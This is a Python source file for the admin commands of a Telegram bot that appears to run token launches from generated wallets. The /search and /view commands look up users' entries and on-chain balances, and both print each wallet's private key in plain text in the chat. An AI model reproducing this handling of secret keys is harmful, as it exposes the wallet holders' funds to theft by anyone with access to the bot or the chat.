from telegram import *
from telegram.ext import *

from datetime import timedelta
from web3 import Web3

from constants import bot, chains
from hooks import api, db


async def command(update: Update, context: CallbackContext) -> int:
    chat_type = update.message.chat.type
    if chat_type == "private":
        user_id = update.effective_user.id
        if user_id in bot.ADMINS:
            await update.message.reply_text(
                "/search [generated wallet]\n"
                "/view\n",
            parse_mode="Markdown"
            )


async def search(update: Update, context: CallbackContext) -> int:
    chat_type = update.message.chat.type
    if chat_type == "private":
        user_id = update.effective_user.id
        if user_id in bot.ADMINS:
            address = " ".join(context.args)
            status_text = db.search_entry_by_address(address)
            if status_text:
                chain_scan = chains.chains[status_text["chain"].lower()].scan_address
                chain_web3 = chains.chains[status_text["chain"].lower()].w3
                web3 = Web3(Web3.HTTPProvider(chain_web3))
                balance_wei = web3.eth.get_balance(status_text["address"])
                balance = web3.from_wei(balance_wei, 'ether')
                await update.message.reply_text(
                    f"`{address}`\n"
                    f"User ID: {status_text["user_id"]}\n"
                    f"User Name: {status_text["user_name"]}\n"
                    f"Opened: {status_text["timedate"]}\n"
                    f"Secret Key: `{status_text["secret_key"]}`\n\n"
                    f"{status_text["chain"]}\n"
                    f"Ticker: {status_text["ticker"]}\n"
                    f"Name: {status_text["name"]}\n"
                    f"Supply: {status_text["supply"]}\n"
                    f"TG Portal: {status_text["portal"]}\n"
                    f"Website: {status_text["website"]}\n\n"
                    f"Current Balance:\n"
                    f"{balance} ETH\n\n"
                    f"Ownership will be transfered to:\n{status_text["owner"]}\n\n",
                parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                                text="Wallet Link",
                                url=f"{chain_scan}{address}",
                            )
                        ],
                    ]
                ),
                        )
            else:
                 await update.message.reply_text(f"Nothing found for `{address}`",
            parse_mode="Markdown"
            )
                 

async def view(update: Update, context: CallbackContext) -> int:
    chat_type = update.message.chat.type
    if chat_type == "private":
        user_id = update.effective_user.id
        if user_id in bot.ADMINS:
            entries = db.fetch_all_entries()

            if not entries:
                await update.message.reply_text("No entries found.")
                return ConversationHandler.END
            
            formatted_entries = []
            for entry in entries:
                chain_scan = chains.chains[entry["chain"].lower()].scan_address
                chain_web3 = chains.chains[entry["chain"].lower()].w3
                web3 = Web3(Web3.HTTPProvider(chain_web3))
                balance_wei = web3.eth.get_balance(entry["address"])
                balance = web3.from_wei(balance_wei, 'ether')
                formatted_entry = (
                    f"User Name: {entry['user_name']}\n"
                    f"User ID: {entry['user_id']}\n"
                    f"Submitted: {entry['timedate']}\n"
                    f"Current Balance: {balance} ETH\n"
                    f"Address: `{entry['address']}`\n"
                    f"Secret Key: `{entry['secret_key']}`\n"
                    f"Chain: {entry['chain']}\n"
                    f"Ticker: {entry['ticker']}\n"
                    f"Owner: `{entry['owner']}`\n"
                    f"-----------------------\n"
                )
                formatted_entries.append(formatted_entry)

            message = "".join(formatted_entries)
            
            await update.message.reply_text(
                message,
                parse_mode="Markdown"
            )